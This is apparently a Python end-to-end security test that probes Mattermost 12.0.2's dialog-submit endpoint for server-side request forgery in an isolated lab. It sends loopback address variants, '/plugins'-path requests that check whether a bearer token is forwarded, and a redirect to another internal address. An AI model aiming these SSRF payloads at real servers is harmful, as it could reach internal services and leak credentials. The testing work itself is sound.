#!/usr/bin/env python3
"""Native E2E Mattermost 12.0.2 interactive dialog SSRF trust-boundary test.
Server and probe run ONLY in isolated CI. No requests to real internal assets.
DIALOG_ALLOWED=0 => default forbidden policy; =1 => explicit lab allowlist positive control.
"""
import json, os, secrets, sys, time, threading, urllib.request, urllib.error
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
BASE="http://127.0.0.1:8065/api/v4"
PORT=19487
ALLOWED=os.getenv("DIALOG_ALLOWED")=="1"
SEEN=[]
CHECKS=[]
class Probe(BaseHTTPRequestHandler):
    def do_POST(self):
        payload=self.rfile.read(min(int(self.headers.get("Content-Length","0")),8192))
        SEEN.append({"path":self.path,"payload":payload.decode(errors="replace"),
            "bearer_forwarded":self.headers.get("Authorization","").startswith("Bearer ")})
        if self.path=="/plugins/redirect-internal":
            # Redirect to a different IP+path; never leave the disposable CI worker.
            self.send_response(307)
            self.send_header("Location",f"http://127.0.0.2:{PORT}/redirect-final")
            self.send_header("Content-Length","0")
            self.end_headers();return
        data=json.dumps({"type":"ok"}).encode()
        self.send_response(200);self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(data)));self.end_headers();self.wfile.write(data)
    def log_message(self,*args):return
def call(method,path,body=None,token=None):
    headers={"Content-Type":"application/json"}
    if token:headers["Authorization"]="Bearer "+token
    b=json.dumps(body).encode() if body is not None else None
    req=urllib.request.Request(BASE+path,headers=headers,method=method,data=b)
    try:
        with urllib.request.urlopen(req,timeout=18) as r: code=r.status;data=r.read();h=r.headers
    except urllib.error.HTTPError as e: code=e.code;data=e.read();h=e.headers
    try: obj=json.loads(data.decode()) if data else None
    except Exception: obj=None
    return code,obj,h
def check(name,passed,actual,expected):
    record={"test":name,"pass":bool(passed),"actual":actual,"expected":expected}
    CHECKS.append(record)
    print("CHECK "+json.dumps(record,sort_keys=True),flush=True)
def must(code,want,reason):
    if code!=want:raise RuntimeError(reason+" expected "+str(want)+" got "+str(code))
def login(u,p):
    c,_,h=call("POST","/users/login",{"login_id":u,"password":p})
    must(c,200,"login")
    return h["Token"]
def submit(t,channel,team,url):
    return call("POST","/actions/dialogs/submit",{
      "url":url,"channel_id":channel,"team_id":team,"submission":{"probe":"only_test_data"},
      "callback_id":"lab","state":"lab","file_ids":[]},t)
def main():
    server=ThreadingHTTPServer(("0.0.0.0",PORT),Probe)
    threading.Thread(target=server.serve_forever,daemon=True).start()
    suffix=secrets.token_hex(4);pwd="Aa9!"+secrets.token_urlsafe(22)
    users=[];tokens=[]
    for prefix in ["labowner","labuser"]:
        name=prefix+suffix
        c,u,_=call("POST","/users",{"username":name,"email":name+"@example.invalid","password":pwd})
        must(c,201,"create owned user");users.append(u["id"]);tokens.append(login(name,pwd))
    A,B=tokens;aid,bid=users
    c,team,_=call("POST","/teams",{"name":"dsi"+suffix,"display_name":"Dialog SSRF DSI","type":"O"},A)
    must(c,201,"create team");tid=team["id"]
    c,_,_=call("POST",f"/teams/{tid}/members",{"team_id":tid,"user_id":bid},A)
    must(c,201,"add B to team")
    c,pub,_=call("POST","/channels",{"team_id":tid,"name":"pub"+suffix,"display_name":"Dialog Public","type":"O"},A)
    must(c,201,"public channel");pubid=pub["id"]
    c,priv,_=call("POST","/channels",{"team_id":tid,"name":"priv"+suffix,"display_name":"Dialog Private","type":"P"},A)
    must(c,201,"private channel");privid=priv["id"]
    c,_,_=call("POST",f"/channels/{pubid}/members",{"user_id":bid},A)
    must(c,201,"B public channel member")
    c,_,_=call("GET",f"/channels/{privid}",token=B)
    check("T01_B_private_channel_read_negative_control",c in (403,404),c,"403/404")
    url=f"http://127.0.0.1:{PORT}/owned-internal"
    c,body,_=submit(B,privid,tid,url)
    check("T02_B_private_channel_submit_denied",c in (403,404),c,"403/404")
    count_before=len(SEEN)
    # ATTACK: B can read public channel but tries to make the Mattermost server request a loopback service.
    c,body,_=submit(B,pubid,tid,url)
    time.sleep(.2)
    actual={"http":c,"internal_request_arrived":len(SEEN)>count_before}
    passed=(len(SEEN)>count_before and c==200) if ALLOWED else len(SEEN)==count_before
    check("T03_B_loopback_SSRF_boundary",passed,actual,
      "request arrives only when admin allowlists localhost")
    # Equivalent normalized loopback forms. No remote targets.
    for index,host in enumerate(["localhost","127.1","127.0.0.1"],4):
        before=len(SEEN)
        c,body,_=submit(B,pubid,tid,f"http://{host}:{PORT}/variant-{index}")
        time.sleep(.15)
        landed=len(SEEN)>before
        check(f"T0{index}_loopback_variant", (landed and c==200) if ALLOWED else not landed,
              {"http":c,"internal_request_arrived":landed},
              "arrives only when explicit allowlist permits this address")
    # HYPOTHESIS: same hostname and /plugins-looking path incorrectly switches
    # to the *trusted* transport even when target is a different TCP port.
    for idx,plugin_path in enumerate(("/plugins/owned-internal","/plugins-malformed-branch"),1):
        previous=len(SEEN)
        st,body,_=submit(B,pubid,tid,f"http://127.0.0.1:{PORT}{plugin_path}")
        matching=[h for h in SEEN[previous:] if h["path"]==plugin_path]
        reached=bool(matching)
        forwarded=bool(matching and matching[-1]["bearer_forwarded"])
        check("T09_trusted_plugin_prefix_cross_port_"+str(idx),
            reached and st==200 and forwarded,
            {"http":st,"internal_request_arrived":reached,"bearer_header_forwarded":forwarded},
            "Default-untrusted config: bad plugin path+different port should not be treated as trusted; if pass=true, bypass reproduced")
    # Follow trusted HTTP 307 to *another* loopback address, outside plugin path.
    previous=len(SEEN)
    st,body,_=submit(B,pubid,tid,f"http://127.0.0.1:{PORT}/plugins/redirect-internal")
    newhits=SEEN[previous:]
    last_hit=any(h["path"]=="/redirect-final" for h in newhits)
    check("T11_trusted_plugin_redirect_cross_ip",
          last_hit and st==200,
          {"http":st,"request_landed_at_other_internal_ip":last_hit},
          "If true, trust survives redirection beyond plugin endpoint")
    # One HTTP request in each test is non-destructive, only owned canary data.
    # Attack-controlled fields must not impersonate an identity or team downstream even in allowed control.
    if ALLOWED and SEEN:
        sample=json.loads(SEEN[0]["payload"])
        check("T08_identity_bound_to_logged_in_user",
              sample.get("user_id")==bid and sample.get("team_id")==tid,
              {"user_id_bound":sample.get("user_id")==bid,"team_id_bound":sample.get("team_id")==tid},
              "server derives authenticated user and channel's team")
    else:
        check("T08_no_internal_probe_hit_by_default",len(SEEN)==0,len(SEEN),0)
    print("RESULTS "+json.dumps({"allowed":ALLOWED,"checks":CHECKS,
       "failures":[x["test"] for x in CHECKS if not x["pass"]]},sort_keys=True),flush=True)
    server.shutdown()
    if any(not x["pass"] for x in CHECKS):sys.exit(2)
if __name__=="__main__":
    try:main()
    except Exception as exc:
        print("E2E_ERROR "+type(exc).__name__+": "+str(exc),flush=True);sys.exit(1)
